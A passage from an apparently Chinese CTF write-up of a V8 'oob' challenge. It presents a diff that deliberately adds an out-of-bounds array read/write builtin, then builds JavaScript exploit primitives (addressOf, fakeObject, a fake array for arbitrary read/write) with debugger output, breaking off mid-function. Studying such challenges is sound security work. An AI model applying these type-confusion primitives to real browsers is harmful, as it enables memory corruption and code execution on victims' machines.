&lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br><span class="line">pwndbg&gt; job 0x2658b5f8df19</span><br><span class="line">0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>PS：在<code>release</code>使用 <code>job</code>命令会报`No symbol “_v8_internal_Print_Object” in current context. 的错误</p><table><thead><tr><th align="center">map</th><th align="center">表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</th></tr></thead><tbody><tr><td align="center">prototype</td><td align="center">prototype</td></tr><tr><td align="center">elements</td><td align="center">对象元素</td></tr><tr><td align="center">length</td><td align="center">元素个数</td></tr><tr><td align="center">properties</td><td align="center">属性</td></tr></tbody></table><blockquote><p>Value B is an 8 bytes long value //in x64.<br>If B is a double:<br>    B is the binary representation of a double<br>Else:<br>    if B is a int32:<br>        B = the value of B &lt;&lt; 32 // which mean 0xdeadbeef is 0xdeadbeef00000000 in v8<br>    else: // B is a pointer<br>        B = B | 1</p></blockquote><p><code>v8</code>在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1。例：上述 elements的实际地址应为 <code>0x2658b5f8de39-1</code></p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析题目所给出的<code>diff</code>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  &#x2F;&#x2F; namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len &#x3D; args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len &#x3D;&#x3D; 1)&#123;</span><br><span class="line">+        &#x2F;&#x2F;read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        &#x2F;&#x2F;write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   &#x2F;* https:&#x2F;&#x2F;tc39.github.io&#x2F;proposal-flatMap&#x2F;#sec-Array.prototype.flatMap *&#x2F;   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   &#x2F;* ArrayBuffer *&#x2F;                                                            \</span><br><span class="line">   &#x2F;* ES #sec-arraybuffer-constructor *&#x2F;                                        \</span><br><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;typer.cc b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     &#x2F;&#x2F; ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><ul><li>自定义了一个函数kArrayOob，可以通过oob调用</li><li>该函数将首先检查参数的数量是否大于2（第一个参数始终是<code>this</code>参数）。如果是，则返回undefined。</li><li>如果只有一个参数（<code>this</code>），则会返回<code>array[length]</code>。</li><li>如果有两个参数（<code>this</code>和<code>value</code>），它将<code>value</code>作为一个浮点数写入<code>array[length]</code>。(以上所述的参数均为cpp中)</li><li>上述逻辑转换为JavaScript中的对应逻辑就是，当<code>oob</code>函数的参数为空时，返回数组对象第length个元素内容；当<code>oob</code>函数参数个数不为0时，就将第一个参数写入到数组中的第length个元素位置。</li></ul><p>编写<code>test.js</code>如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> addr = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return addr:&quot;</span> + addr.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x25641fd4ddd9-1</span><br><span class="line">00:0000│   0x25641fd4ddd8 —▸ 0xe46856c2d99 ◂— 0x400003e40e90401&lt;--- map</span><br><span class="line">01:0008│   0x25641fd4dde0 —▸ 0x3e40e9040c71 ◂— 0x3e40e90408&lt;--- properties</span><br><span class="line">02:0010│   0x25641fd4dde8 —▸ 0x25641fd4dd69 ◂— 0x3e40e90408&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4ddf0 ◂— 0x300000000&lt;--- length</span><br><span class="line">04:0020│   0x25641fd4ddf8 ◂— 0x0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000&lt;--- length</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000&lt;--- elements</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000&lt;--- elements</span><br><span class="line">05:0028│   0x25641fd4dd90 —▸ 0x3e40e9040851 ◂— 0x3e40e90401&lt;--- map</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob return addr:3.38180564031224e-310</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90     &lt;--- map pointer</span><br><span class="line">$17 &#x3D; 3.3818056403122411e-310</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000</span><br><span class="line">05:0028│   0x25641fd4dd90 ◂— 0x4000000000000000   &lt;--- 被覆盖</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90</span><br><span class="line">$18 &#x3D; 2</span><br></pre></td></tr></table></figure><p>可以发现v8的内存对象大致如下：其中<code>map pointer</code>描述数组对象的结构，<code>element pointer</code>是存储数组元素的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-32 : some pointer &#x2F;&#x2F; not related to the challenge. This is memory is also where the element pointer points at.</span><br><span class="line">-24 : length of segment</span><br><span class="line">-16 : element 0 </span><br><span class="line">-8  : element 1</span><br><span class="line">+0  : map pointer &#x2F;&#x2F; the address where the obj pointer points at</span><br><span class="line">+8  : property pointer</span><br><span class="line">+16 : element pointer &#x2F;&#x2F;pointing at location -32</span><br><span class="line">+24 : length( in the high four bytes )</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">%DebugPrint(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">DebugPrint: 0x3db1856cddd9: [JSArray]</span><br><span class="line"> - map: 0x0306e9582f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c8177d11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x1bb28b3c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x26c38c5c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x3db1856cdd81 &lt;Object map &#x3D; 0x306e9580459&gt;</span><br><span class="line">           1: 0x3db1856cde19 &lt;HeapNumber 2.2&gt;</span><br></pre></td></tr></table></figure><p>通过上述例子，我们可以看到我们所泄露出来的地址就是<code>map pointer</code>，而<code>map pointer</code>数组的指示其元素的类型，如果我们利用<code>oob</code>的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象 B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p><p>如果我们定义一个 <code>FloatArray</code> 浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问 B[0] 返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问 B[0] 时，返回的就不是对象元素 B[0] ，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问 A[0] 时，返回的就不是浮点数 A[0]，而是以 A[0] 为内存地址的一个JavaScript对象了。</p><p>其实到现在可以简化一下漏洞：</p><ul><li>泄露 <code>map pointer</code></li><li>覆写 <code>map pointer</code></li></ul><h4 id="addressOf-amp-amp-fakeObject"><a href="#addressOf-amp-amp-fakeObject" class="headerlink" title="addressOf &amp;&amp; fakeObject"></a>addressOf &amp;&amp; fakeObject</h4><blockquote><p>我们得到的数据都是浮点数的形式，而我们需要的是其在内存中的16进制数据，所以需要浮点数和整数之间的转换</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//var test = &#123;&#125;;</span></span><br><span class="line"><span class="comment">//%DebugPrint(test);</span></span><br><span class="line"><span class="comment">//var testAddr = addressOf(test);</span></span><br><span class="line"><span class="comment">//console.log(&quot;[*] leak object addr: 0x&quot; + hex(testAddr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">v8/out.gn/x64.release$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">0x26ebb348f061 &lt;Object map = 0x2e6f2340459&gt;</span></span><br><span class="line"><span class="comment">[*] leak object addr: 0x000026ebb348f060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>我们可以写一个 js 数组伪造成一个 js 对象(结构如下)，那么当我们访问<code>fake_array[2]</code>的时候就会当成一个对象去访问，那么我们就可以修改他的值，从而实现任意地址写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map, </span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    i2f(<span class="number">0x4141414141414141</span>),  <span class="comment">//&lt;-- elements指针</span></span><br><span class="line">    i2f(<span class="number">0x400000000</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1111</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(a[<span class="number">0</span>]);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0de19: [JSArray]</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b1442f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dd1111 &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 2</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x296b7b3c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; &#123;</span></span><br><span class="line"><span class="comment">           0: 0x3f28a7f0dda9 &lt;Object map = 0x17f6b144ab39&gt;   &lt;--- elements point</span></span><br><span class="line"><span class="comment">           1: 0x3f28a7f0de59 &lt;HeapNumber 2.2&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0dda9: [JS_OBJECT_TYPE]                  &lt;--- elements point</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b144ab39 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dc2091 &lt;Object map = 0x17f6b1440229&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x394d91600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #a: 1111 (const data field 0)</span></span><br><span class="line"><span class="comment"> &#125;*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + 